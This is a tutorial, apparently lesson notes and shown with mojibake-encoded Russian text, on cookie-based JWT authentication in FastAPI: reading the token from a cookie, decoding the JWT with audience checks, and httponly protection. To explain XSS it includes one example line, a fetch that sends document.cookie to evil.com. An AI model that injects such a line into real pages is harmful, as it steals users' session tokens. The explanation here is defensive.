# üìö –ó–∞–Ω—è—Ç–∏–µ ‚Ññ2: Cookie-Based Authentication (–ß–∞—Å—Ç—å 1)

## –ö–æ–º–º–∏—Ç: –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ cookie

---

## üéØ –ß—Ç–æ –º—ã –¥–µ–ª–∞–ª–∏

–î–æ —ç—Ç–æ–≥–æ –º–æ–º–µ–Ω—Ç–∞ –Ω–∞—à–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–æ **Bearer-—Ç–æ–∫–µ–Ω—ã** –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–ª–æ, —á—Ç–æ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥ (–Ω–∞–ø—Ä–∏–º–µ—Ä, React) –¥–æ–ª–∂–µ–Ω –±—ã–ª:

1. –ü–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω —á–µ—Ä–µ–∑ POST `/auth/login`
2. –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –µ–≥–æ –≤ `localStorage` –∏–ª–∏ `sessionStorage`
3. –ü—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ –¥–æ–±–∞–≤–ª—è—Ç—å —Ç–æ–∫–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Authorization: Bearer <token>`

–ù–æ –¥–ª—è **Server-Side Rendering** (–∫–æ–≥–¥–∞ HTML –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –Ω–∞ –±—ç–∫–µ–Ω–¥–µ) —ç—Ç–æ—Ç –ø–æ–¥—Ö–æ–¥ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç! –ü–æ—á–µ–º—É?

- **HTML-—Ñ–æ—Ä–º—ã –Ω–µ —É–º–µ—é—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏** ‚Äî –æ–Ω–∏ –º–æ–≥—É—Ç —Ç–æ–ª—å–∫–æ POST –¥–∞–Ω–Ω—ã–µ
- **–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –º–æ–∂–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è—Ç—å —Ç–æ–∫–µ–Ω—ã** –≤ –∫–∞–∂–¥—ã–π –∑–∞–ø—Ä–æ—Å
- **–°—Ç—Ä–∞–Ω–∏—Ü–∞ –Ω–µ –∑–Ω–∞–µ—Ç –æ —Ç–æ–∫–µ–Ω–µ** –ø—Ä–∏ –ø–µ—Ä–≤–æ–π –∑–∞–≥—Ä—É–∑–∫–µ

–ü–æ—ç—Ç–æ–º—É –º—ã –ø–µ—Ä–µ—Ö–æ–¥–∏–º –Ω–∞ **Cookie-Based Authentication**. –¢–æ–∫–µ–Ω –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤ **HTTP-only cookie**, –∫–æ—Ç–æ—Ä—É—é –±—Ä–∞—É–∑–µ—Ä **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏** –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å –∫–∞–∂–¥—ã–º –∑–∞–ø—Ä–æ—Å–æ–º.

---

## üç™ –ß—Ç–æ —Ç–∞–∫–æ–µ Cookie –∏ —á–µ–º –æ–Ω–∞ –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç localStorage

### localStorage (—Å—Ç–∞—Ä—ã–π –ø–æ–¥—Ö–æ–¥)

```javascript
// JavaScript –∫–æ–¥ –Ω–∞ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–µ
localStorage.setItem('token', 'eyJhbGci...')

// –ü—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ –Ω—É–∂–Ω–æ –≤—Ä—É—á–Ω—É—é –¥–æ–±–∞–≤–ª—è—Ç—å
fetch('/api/products', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
})
```

**–ü—Ä–æ–±–ª–µ–º—ã:**

- JavaScript –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø –∫ —Ç–æ–∫–µ–Ω—É ‚Üí —É—è–∑–≤–∏–º–æ—Å—Ç—å –¥–ª—è XSS –∞—Ç–∞–∫
- –ù–µ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å –æ–±—ã—á–Ω—ã–º–∏ HTML-—Ñ–æ—Ä–º–∞–º–∏
- –¢–æ–∫–µ–Ω –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

### Cookie (–Ω–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥)

```python
# Python –∫–æ–¥ –Ω–∞ –±—ç–∫–µ–Ω–¥–µ
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,  # JavaScript –ù–ï –º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å!
    samesite="lax"  # –ó–∞—â–∏—Ç–∞ –æ—Ç CSRF
)
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**

- –ë—Ä–∞—É–∑–µ—Ä **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏** –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie —Å –∫–∞–∂–¥—ã–º –∑–∞–ø—Ä–æ—Å–æ–º
- `httponly=True` ‚Üí JavaScript **–Ω–µ –º–æ–∂–µ—Ç** –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ç–æ–∫–µ–Ω ‚Üí –∑–∞—â–∏—Ç–∞ –æ—Ç XSS
- –†–∞–±–æ—Ç–∞–µ—Ç —Å –æ–±—ã—á–Ω—ã–º–∏ HTML-—Ñ–æ—Ä–º–∞–º–∏ –∏ —Å—Å—ã–ª–∫–∞–º–∏
- –ù–µ –Ω—É–∂–µ–Ω JavaScript –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å —Ç–æ–∫–µ–Ω–æ–º

---

## üìÅ –°–æ–∑–¥–∞–Ω–∏–µ –º–æ–¥—É–ª—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π

–ú—ã —Å–æ–∑–¥–∞–ª–∏ –Ω–æ–≤—ã–π —Ñ–∞–π–ª `auth/dependencies.py`, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç —Ñ—É–Ω–∫—Ü–∏—é –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ cookie.

### –§–∞–π–ª: `auth/dependencies.py`

#### –ó–∞—á–µ–º –Ω—É–∂–µ–Ω —ç—Ç–æ—Ç —Ñ–∞–π–ª?

–í FastAPI –µ—Å—Ç—å **—Å–∏—Å—Ç–µ–º–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π (Dependency Injection)**. –≠—Ç–æ –ø–∞—Ç—Ç–µ—Ä–Ω, –∫–æ–≥–¥–∞ —Ñ—É–Ω–∫—Ü–∏—è –º–æ–∂–µ—Ç **—Ç—Ä–µ–±–æ–≤–∞—Ç—å** –∫–∞–∫–∏–µ-—Ç–æ –¥–∞–Ω–Ω—ã–µ, –∏ FastAPI –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏—Ö –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç.

–ù–∞–ø—Ä–∏–º–µ—Ä:

```python
@router.get("/protected")
async def protected_route(
    user: User = Depends(get_current_user_from_cookie)  # ‚Üê FastAPI –≤—ã–∑–æ–≤–µ—Ç —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é
):
    return {"email": user.email}
```

FastAPI –≤–∏–¥–∏—Ç `Depends(get_current_user_from_cookie)`, –≤—ã–∑—ã–≤–∞–µ—Ç —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é, –ø–æ–ª—É—á–∞–µ—Ç –æ–±—ä–µ–∫—Ç `User`, –∏ –ø–µ—Ä–µ–¥–∞—ë—Ç –µ–≥–æ –≤ `protected_route`.

---

## üîç –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—è get_current_user_from_cookie

### –®–∞–≥ 1: –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –∏–∑ cookie

```python
token = request.cookies.get("access_token")
```

–û–±—ä–µ–∫—Ç `request` —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ HTTP-–∑–∞–ø—Ä–æ—Å–µ:

- `request.headers` ‚Äî –∑–∞–≥–æ–ª–æ–≤–∫–∏
- `request.cookies` ‚Äî cookies
- `request.query_params` ‚Äî –ø–∞—Ä–∞–º–µ—Ç—Ä—ã URL (?page=1)

–ú—ã –±–µ—Ä—ë–º cookie —Å –∏–º–µ–Ω–µ–º `"access_token"`. –ï—Å–ª–∏ –µ—ë –Ω–µ—Ç ‚Äî –≤–æ–∑–≤—Ä–∞—â–∞–µ–º `None`.

### –®–∞–≥ 2: –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ JWT —Ç–æ–∫–µ–Ω–∞

```python
payload = jwt.decode(
    token,
    settings.SECRET_KEY,
    algorithms=["HS256"],
    audience=["fastapi-users:auth"],
)
```

**JWT (JSON Web Token)** ‚Äî —ç—Ç–æ –Ω–µ –ø—Ä–æ—Å—Ç–æ —Å–ª—É—á–∞–π–Ω–∞—è —Å—Ç—Ä–æ–∫–∞. –≠—Ç–æ —Ç—Ä–∏ —á–∞—Å—Ç–∏, —Ä–∞–∑–¥–µ–ª—ë–Ω–Ω—ã–µ —Ç–æ—á–∫–∞–º–∏:

```
eyJhbGci...  .  eyJzdWIi...  .  abc123...
   HEADER       PAYLOAD        SIGNATURE
```

1. **HEADER** ‚Äî –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç–æ–º, –∫–∞–∫ –ø–æ–¥–ø–∏—Å–∞–Ω —Ç–æ–∫–µ–Ω (–∞–ª–≥–æ—Ä–∏—Ç–º HS256)
2. **PAYLOAD** ‚Äî –¥–∞–Ω–Ω—ã–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `{"sub": "3"}` ‚Äî ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
3. **SIGNATURE** ‚Äî —Ü–∏—Ñ—Ä–æ–≤–∞—è –ø–æ–¥–ø–∏—Å—å, –¥–æ–∫–∞–∑—ã–≤–∞—é—â–∞—è —á—Ç–æ —Ç–æ–∫–µ–Ω –Ω–µ –ø–æ–¥–¥–µ–ª–∞–Ω

`jwt.decode()` –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å —Å –ø–æ–º–æ—â—å—é `SECRET_KEY`. –ï—Å–ª–∏ –∫—Ç–æ-—Ç–æ –∏–∑–º–µ–Ω–∏—Ç `sub: 3` –Ω–∞ `sub: 1` (—á—Ç–æ–±—ã –ø—Ä–∏—Ç–≤–æ—Ä–∏—Ç—å—Å—è –∞–¥–º–∏–Ω–æ–º), –ø–æ–¥–ø–∏—Å—å –ø–µ—Ä–µ—Å—Ç–∞–Ω–µ—Ç —Å–æ–≤–ø–∞–¥–∞—Ç—å, –∏ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç –æ—à–∏–±–∫–∞.

**–í–∞–∂–Ω–æ –ø—Ä–æ `audience`!**

FastAPI Users –¥–æ–±–∞–≤–ª—è–µ—Ç –≤ —Ç–æ–∫–µ–Ω –ø–æ–ª–µ `"aud": ["fastapi-users:auth"]`. –≠—Ç–æ **–∑–∞—â–∏—Ç–∞ –æ—Ç –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ç–æ–∫–µ–Ω–æ–≤**. –ï—Å–ª–∏ —É –Ω–∞—Å –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–µ—Ä–≤–∏—Å–æ–≤, —Ç–æ–∫–µ–Ω –æ—Ç –æ–¥–Ω–æ–≥–æ –Ω–µ –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –≤ –¥—Ä—É–≥–æ–º.

–ú—ã **–æ–±—è–∑–∞–Ω—ã** —É–∫–∞–∑–∞—Ç—å `audience=["fastapi-users:auth"]` –ø—Ä–∏ –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–∏, –∏–Ω–∞—á–µ –±—É–¥–µ—Ç –æ—à–∏–±–∫–∞.

### –®–∞–≥ 3: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ user_id

```python
user_id: int = payload.get("sub")
```

–í JWT —Ç–æ–∫–µ–Ω–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –ø–æ–ª–µ `"sub"` (subject ‚Äî —Å—É–±—ä–µ–∫—Ç). –≠—Ç–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç JWT.

–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω —Å–æ–∑–¥–∞–Ω –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID=3, –≤ payload –±—É–¥–µ—Ç:

```json
{
  "sub": "3",
  "aud": ["fastapi-users:auth"],
  "exp": 1764191530
}
```

### –®–∞–≥ 4: –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö

```python
result = await session.execute(
    select(User).where(User.id == int(user_id))
)
user = result.scalar_one_or_none()
```

–ú—ã –¥–µ–ª–∞–µ–º SQL-–∑–∞–ø—Ä–æ—Å:

```sql
SELECT * FROM user WHERE id = 3
```

**`scalar_one_or_none()`** –æ–∑–Ω–∞—á–∞–µ—Ç:

- –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω **—Ä–æ–≤–Ω–æ –æ–¥–∏–Ω** –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ‚Üí –≤–µ—Ä–Ω—É—Ç—å –µ–≥–æ
- –ï—Å–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω ‚Üí –≤–µ—Ä–Ω—É—Ç—å `None`
- –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω–æ –±–æ–ª—å—à–µ –æ–¥–Ω–æ–≥–æ ‚Üí –≤—ã–±—Ä–æ—Å–∏—Ç—å –æ—à–∏–±–∫—É (–Ω–æ —Ç–∞–∫–æ–≥–æ –±—ã—Ç—å –Ω–µ –º–æ–∂–µ—Ç, —Ç.–∫. ID —É–Ω–∏–∫–∞–ª–µ–Ω)

---

## üõ°Ô∏è –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫

### –ü–æ—á–µ–º—É –º—ã –≤–æ–∑–≤—Ä–∞—â–∞–µ–º None –≤–º–µ—Å—Ç–æ –≤—ã–±—Ä–æ—Å–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–π?

```python
except jwt.PyJWTError:
    return None
except Exception:
    return None
```

–ï—Å—Ç—å –¥–≤–∞ —Ç–∏–ø–∞ —Å—Ç—Ä–∞–Ω–∏—Ü:

1. **–ü—É–±–ª–∏—á–Ω—ã–µ** (–≥–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –∫–∞—Ç–∞–ª–æ–≥–∞)
   - –ù–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω ‚Üí –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É "–í–æ–π—Ç–∏"
   - –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω ‚Üí –ø–æ–∫–∞–∑—ã–≤–∞–µ–º email –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

2. **–ó–∞—â–∏—â—ë–Ω–Ω—ã–µ** (–∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å)
   - –ù–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω ‚Üí —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ /auth/login
   - –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω ‚Üí –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç

–î–ª—è –ø—É–±–ª–∏—á–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü –Ω–∞–º **–Ω–µ –Ω—É–∂–Ω–∞ –æ—à–∏–±–∫–∞**, –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –≤–æ—à—ë–ª. –ú—ã –ø—Ä–æ—Å—Ç–æ –ø–æ–ª—É—á–∞–µ–º `None` –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π UI.

–î–ª—è –∑–∞—â–∏—â—ë–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü –º—ã **—Å–∞–º–∏ –ø—Ä–æ–≤–µ—Ä–∏–º** `if not user` –∏ —Å–¥–µ–ª–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç.

---

## üîê –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å: –ø–æ—á–µ–º—É httponly –≤–∞–∂–µ–Ω

–ö–æ–≥–¥–∞ –º—ã —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º cookie —Å `httponly=True`:

```python
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True  # ‚Üê –≠—Ç–æ –∫–ª—é—á–µ–≤–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä!
)
```

JavaScript **–Ω–µ –º–æ–∂–µ—Ç** –ø—Ä–æ—á–∏—Ç–∞—Ç—å —ç—Ç—É cookie:

```javascript
// –≠—Ç–æ –ù–ï –°–†–ê–ë–û–¢–ê–ï–¢
console.log(document.cookie)  // access_token –Ω–µ –±—É–¥–µ—Ç –≤ —Å–ø–∏—Å–∫–µ
```

**–ó–∞—â–∏—Ç–∞ –æ—Ç XSS (Cross-Site Scripting):**

–ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏—Ç JavaScript –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á–µ—Ä–µ–∑ –Ω–µ–∑–∞—â–∏—â—ë–Ω–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π), –æ–Ω **–Ω–µ —Å–º–æ–∂–µ—Ç** —É–∫—Ä–∞—Å—Ç—å —Ç–æ–∫–µ–Ω:

```javascript
// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø—ã—Ç–∞–µ—Ç—Å—è —É–∫—Ä–∞—Å—Ç—å —Ç–æ–∫–µ–Ω
fetch('https://evil.com/steal?token=' + document.cookie)
// –ù–æ access_token –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è JavaScript!
```

–ë—Ä–∞—É–∑–µ—Ä **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏** –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie —Ç–æ–ª—å–∫–æ –Ω–∞ –Ω–∞—à —Å–µ—Ä–≤–µ—Ä, –∏ **–Ω–∏–∫–∞–∫–æ–π JavaScript** –Ω–µ –º–æ–∂–µ—Ç –µ—ë –ø—Ä–æ—á–∏—Ç–∞—Ç—å.

---

## üìä –°—Ö–µ–º–∞ —Ä–∞–±–æ—Ç—ã Cookie-Based Auth

```
–ë—Ä–∞—É–∑–µ—Ä                          FastAPI Server
   |                                    |
   |  1. POST /auth/login               |
   |  (email + password) -------------> |
   |                                    |
   |                      2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
   |                      3. –°–æ–∑–¥–∞–Ω–∏–µ JWT —Ç–æ–∫–µ–Ω–∞
   |                                    |
   |  4. HTTP 200 OK                    |
   |     Set-Cookie: access_token=...   |
   | <--------------------------------- |
   |                                    |
   | 5. –ë—Ä–∞—É–∑–µ—Ä —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç cookie        |
   |    (–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏!)                |
   |                                    |
   |  6. GET /                          |
   |     Cookie: access_token=...       |
   | ---------------------------------> |
   |                                    |
   |                      7. get_current_user_from_cookie()
   |                      8. –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ JWT
   |                      9. –ü–æ–∏—Å–∫ user –≤ –ë–î
   |                                    |
   |  10. HTML —Å–æ –¥–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è  |
   | <--------------------------------- |
```

–ö–ª—é—á–µ–≤–æ–µ –æ—Ç–ª–∏—á–∏–µ –æ—Ç Bearer-—Ç–æ–∫–µ–Ω–æ–≤:

- **–®–∞–≥ 5** –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç **–∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏** ‚Äî –Ω–µ –Ω—É–∂–µ–Ω JavaScript
- **–®–∞–≥ 6** ‚Äî –±—Ä–∞—É–∑–µ—Ä **—Å–∞–º** –¥–æ–±–∞–≤–ª—è–µ—Ç cookie –∫ –∑–∞–ø—Ä–æ—Å—É

---

## üí° –†–µ–∑—é–º–µ

**–ß—Ç–æ –º—ã —Å–¥–µ–ª–∞–ª–∏:**

- –°–æ–∑–¥–∞–ª–∏ —Ñ—É–Ω–∫—Ü–∏—é `get_current_user_from_cookie()` –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ JWT –≤ cookie
- –§—É–Ω–∫—Ü–∏—è –¥–µ–∫–æ–¥–∏—Ä—É–µ—Ç —Ç–æ–∫–µ–Ω —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º `audience`
- –ò—â–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ë–î –ø–æ ID –∏–∑ —Ç–æ–∫–µ–Ω–∞
- –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç `None` –ø—Ä–∏ –ª—é–±–æ–π –æ—à–∏–±–∫–µ (–¥–ª—è –ø—É–±–ª–∏—á–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü)

**–ü–æ—á–µ–º—É —ç—Ç–æ –≤–∞–∂–Ω–æ:**

- Cookie —Ä–∞–±–æ—Ç–∞—é—Ç —Å –æ–±—ã—á–Ω—ã–º–∏ HTML-—Ñ–æ—Ä–º–∞–º–∏ (–±–µ–∑ JavaScript)
- `httponly=True` –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç XSS –∞—Ç–∞–∫
- –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie —Å –∫–∞–∂–¥—ã–º –∑–∞–ø—Ä–æ—Å–æ–º
- –≠—Ç–æ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç –¥–ª—è Server-Side –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏

**–ß—Ç–æ –¥–∞–ª—å—à–µ:**
–í —Å–ª–µ–¥—É—é—â–µ–π —á–∞—Å—Ç–∏ –º—ã —Å–æ–∑–¥–∞–¥–∏–º HTML-—Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞ –∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É —Å–∏—Å—Ç–µ–º—É.
